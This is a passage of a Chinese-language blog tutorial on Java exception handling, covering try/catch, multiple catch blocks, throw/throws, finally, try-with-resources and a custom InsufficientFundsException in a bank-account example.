align="left"><strong>序号</strong></th><th align="left"><strong>方法及说明</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public String getMessage()</strong> 返回关于发生的异常的详细信息。这个消息在Throwable 类的构造函数中初始化了。</td></tr><tr><td align="left">2</td><td align="left"><strong>public Throwable getCause()</strong> 返回一个 Throwable 对象代表异常原因。</td></tr><tr><td align="left">3</td><td align="left"><strong>public String toString()</strong> 返回此 Throwable 的简短描述。</td></tr><tr><td align="left">4</td><td align="left"><strong>public void printStackTrace()</strong> 将此 Throwable 及其回溯打印到标准错误流。。</td></tr><tr><td align="left">5</td><td align="left"><strong>public StackTraceElement [] getStackTrace()</strong> 返回一个包含堆栈层次的数组。下标为0的元素代表栈顶，最后一个元素代表方法调用堆栈的栈底。</td></tr><tr><td align="left">6</td><td align="left"><strong>public Throwable fillInStackTrace()</strong> 用当前的调用栈层次填充Throwable 对象栈层次，添加到栈层次任何先前信息中。</td></tr></tbody></table><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p><strong>使用 try 和 catch 关键字可以捕获异常</strong>。try/catch 代码块放在异常可能发生的地方。</p><p>try/catch代码块中的代码称为<u>保护代码</u>，使用 try/catch 的语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(ExceptionName e1)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//Catch 块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Catch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。</p><p>如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。</p><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>下面的例子中声明有两个元素的一个数组，当代码试图访问数组的第四个元素的时候就会抛出一个异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExcepTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">            System.out.println(<span class="string">&quot;Access element three : &quot;</span> + arr[<span class="number">3</span>]);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArrayIndexOutOfBoundsException e)</span><br><span class="line">        &#123; <span class="comment">//ArrayIndexOutOfBoundsException用非法索引访问数组时抛出的异常。如果索引为负或大于等于数组大小，则该索引为非法索引。</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Exception thrown : &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Out of the block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152214646.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152215842.png"></p><h2 id="多重捕获块"><a href="#多重捕获块" class="headerlink" title="多重捕获块"></a>多重捕获块</h2><p><strong>一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获</strong>。</p><p>多重捕获块的语法如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">   <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">1</span> 异常的变量名<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">2</span> 异常的变量名<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">3</span> 异常的变量名<span class="number">3</span>)&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码段包含了 3 个 catch块。</p><p>可以在 try 语句后面添加任意数量的 catch 块。</p><p>如果保护代码中发生异常，异常被抛给第一个 catch 块。</p><p>如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。</p><p>如果不匹配，它会被传递给第二个 catch 块。</p><p>如此，直到异常被捕获或者通过所有的 catch 块。</p><h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><p>该实例展示了怎么使用多重 try/catch。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    file = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">    x = (<span class="keyword">byte</span>) file.read();</span><br><span class="line">&#125; <span class="keyword">catch</span>(FileNotFoundException f) &#123; <span class="comment">// Not valid!</span></span><br><span class="line">    f.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span>(IOException i) &#123;</span><br><span class="line">    i.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="throws-throw-关键字"><a href="#throws-throw-关键字" class="headerlink" title="throws/throw 关键字"></a>throws/throw 关键字</h2><p>在Java中， <strong>throw</strong> 和 <strong>throws</strong> 关键字是用于处理异常的。</p><p><strong>throw</strong> 关键字用于在代码中抛出异常，而 <strong>throws</strong> 关键字用于在方法声明中指定可能会抛出的异常类型。</p><h3 id="throw-关键字"><a href="#throw-关键字" class="headerlink" title="throw 关键字"></a>throw 关键字</h3><p><strong>throw</strong> 关键字用于在当前<strong>方法中</strong>抛出一个异常。</p><p>通常情况下，当代码执行到某个条件下无法继续正常执行时，可以使用 <strong>throw</strong> 关键字抛出异常，以告知调用者当前代码的执行状态。</p><p>例如，下面的代码中，在方法中判断 num 是否小于 0，如果是，则抛出一个 IllegalArgumentException 异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkNumber</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Number must be postive!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="throws-关键字"><a href="#throws-关键字" class="headerlink" title="throws 关键字"></a>throws 关键字</h3><p><strong>throws</strong> 关键字用于在<strong>方法声明中</strong>指定该方法可能抛出的异常。当方法内部抛出指定类型的异常时，该异常会被传递给调用该方法的代码，并在该代码中处理异常。</p><p>例如，下面的代码中，当 readFile 方法内部发生 IOException 异常时，会将该异常传递给调用该方法的代码。在调用该方法的代码中，必须捕获或声明处理 IOException 异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filePath));</span><br><span class="line">  String line = reader.readLine();</span><br><span class="line">  <span class="keyword">while</span> (line != <span class="keyword">null</span>) &#123;</span><br><span class="line">    System.out.println(line);</span><br><span class="line">    line = reader.readLine();</span><br><span class="line">  &#125;</span><br><span class="line">  reader.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。</p><p>例如，下面的方法声明抛出 RemoteException 和 InsufficientFundsException：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">className</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">double</span> amount)</span> <span class="keyword">throws</span> RemoteException,InsufficientFundsException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// Method implementation</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//Remainder of class definition</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="finally关键字"><a href="#finally关键字" class="headerlink" title="finally关键字"></a>finally关键字</h2><p>finally 关键字用来创建在 try 代码块后面执行的代码块。</p><p><strong>无论是否发生异常，finally 代码块中的代码总会被执行</strong>。</p><p>在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。</p><p>f<strong>inally 代码块出现在 catch 代码块最后</strong>，语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">1</span> 异常的变量名<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">2</span> 异常的变量名<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">  <span class="comment">// 程序代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例</strong>：finally代码块里有收尾善后性质的语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExcepTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Access element three : &quot;</span> + arr[<span class="number">3</span>]);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArrayIndexOutOfBoundsException e)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Exception thrown: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            arr[<span class="number">0</span>] = <span class="number">6</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;First element value: &quot;</span> + arr[<span class="number">0</span>]);</span><br><span class="line">            System.out.println(<span class="string">&quot;The finally statement is executed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152237079.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152237745.png"></p><p><strong>注意</strong>：</p><ul><li>catch 不能独立于 try 存在。</li><li>在 try/catch 后面添加 finally 块并非强制性要求的。</li><li>try 代码后不能既没 catch 块也没 finally 块。</li><li><strong>try, catch, finally 块之间不能添加任何代码</strong>。</li></ul><h2 id="try-with-resources"><a href="#try-with-resources" class="headerlink" title="try-with-resources"></a>try-with-resources</h2><p>JDK7 之后，Java 新增的 <strong>try-with-resource</strong> 语法糖来打开资源，并且可以在语句执行完毕后确保每个资源都被自动关闭 。</p><p>JDK7 之前所有被打开的系统资源，比如流、文件或者 Socket 连接等，都需要被开发者手动关闭，否则将会造成资源泄露。</p><p><code>try-with-resource</code>的用法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (resource declaration) &#123;</span><br><span class="line">  <span class="comment">// 使用的资源</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (ExceptionType e1) &#123;</span><br><span class="line">  <span class="comment">// 异常块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的语法中 <strong>try 用于声明和实例化资源</strong>，catch 用于处理关闭资源时可能引发的所有异常。</p><p><strong>注意：</strong>try-with-resources 语句关闭所有实现 AutoCloseable 接口的资源。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExcepTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    String line;</span><br><span class="line">        <span class="keyword">try</span>(BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">&quot;test.txt&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Line =&gt;&quot;</span>+line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;IOException in try block =&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152252684.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152253912.png"></p><p>以上实例中，我们实例一个 BufferedReader 对象从 test.txt 文件中读取数据。</p><p>在 try-with-resources 语句中声明和实例化 BufferedReader 对象，执行完毕后实例资源，不需要考虑 try 语句是正常执行还是抛出异常。</p><p>如果发生异常，可以使用 catch 来处理异常。</p><p>再看下不使用 <strong>try-with-resources</strong> 而改成 <strong>finally</strong> 来关闭资源，整体代码量多了很多，而且更复杂繁琐了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExcepTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Entering try block&quot;</span>);</span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">&quot;test.txt&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Line =&gt;&quot;</span>+line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;IOException in try block =&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Entering finally block&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (br != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;IOException in finally block =&gt;&quot;</span>+e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line">Entering <span class="keyword">try</span> block</span><br><span class="line">IOException in <span class="keyword">try</span> block =&gt;test.txt (No such file or directory)</span><br><span class="line">Entering <span class="keyword">finally</span> block</span><br></pre></td></tr></table></figure><h3 id="try-with-resources-处理多个资源"><a href="#try-with-resources-处理多个资源" class="headerlink" title="try-with-resources 处理多个资源"></a>try-with-resources 处理多个资源</h3><p>try-with-resources 语句中可以声明多个资源，方法是使用分号 <strong>;</strong> 分隔各个资源：</p><p><strong>实例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExcepTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (Scanner scanner = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> File(<span class="string">&quot;testRead.txt&quot;</span>));</span><br><span class="line">            PrintWriter writer = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> File(<span class="string">&quot;testWrite.txt&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                writer.print(scanner.nextLine());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上实例使用 Scanner 对象从 testRead.txt 文件中读取一行并将其写入新的 testWrite.txt 文件中。</p><p>多个声明资源时，<strong>try-with-resources</strong> 语句以相反的顺序关闭这些资源。 在本例中，PrintWriter 对象先关闭，然后 Scanner 对象关闭。</p><h2 id="声明自定义异常"><a href="#声明自定义异常" class="headerlink" title="声明自定义异常"></a>声明自定义异常</h2><p>在 Java 中你可以自定义异常。编写自己的异常类时需要记住下面的几点。</p><ul><li>所有异常都必须是 Throwable 的子类。</li><li>如果希望写一个检查性异常类，则需要继承 Exception 类。</li><li>如果你想写一个运行时异常类，那么需要继承 RuntimeException 类。</li></ul><p>可以像下面这样定义自己的异常类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;   </span><br><span class="line">    <span class="comment">//继承了Exception类，是检查性异常类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只继承Exception 类来创建的异常类是检查性异常类。</p><p>下面的 InsufficientFundsException 类是用户定义的异常类，它继承自 Exception。</p><p>一个异常类和其它任何类一样，包含有变量和方法。</p><p><strong>实例</strong></p><p>以下实例是一个银行账户的模拟，通过银行卡的号码完成识别，可以进行存钱和取钱的操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名InsufficientFundsException.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//自定义异常类，继承Exception类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsufficientFundsException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//此处的amount用来储存当出现异常（取出钱多于余额时）所缺乏的钱</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">double</span> amount;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">InsufficientFundsException</span><span class="params">(<span class="keyword">double</span> amount)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.amount = amount;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getAmount</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> amount;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了展示如何使用我们自定义的异常类，</p><p>在下面的 CheckingAccount 类中包含一个 withdraw() 方法抛出一个 InsufficientFundsException 异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名称 CheckingAccount.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//此类模拟银行账户</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckingAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//balance为余额，number为卡号</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">double</span> balance;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> number;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">CheckingAccount</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.number = number;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//方法：存钱</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">double</span> amount)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      balance += amount;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//方法：取钱</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">double</span> amount)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">                              InsufficientFundsException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(amount &lt;= balance)</span><br><span class="line">      &#123;</span><br><span class="line">         balance -= amount;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">double</span> needs = amount - balance;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> InsufficientFundsException(needs);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//方法：返回余额</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getBalance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> balance;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//方法：返回卡号</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> number;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的 BankDemo 程序示范了如何调用 CheckingAccount 类的 deposit() 和 withdraw() 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名称 BankDemo.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BankDemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      CheckingAccount c = <span 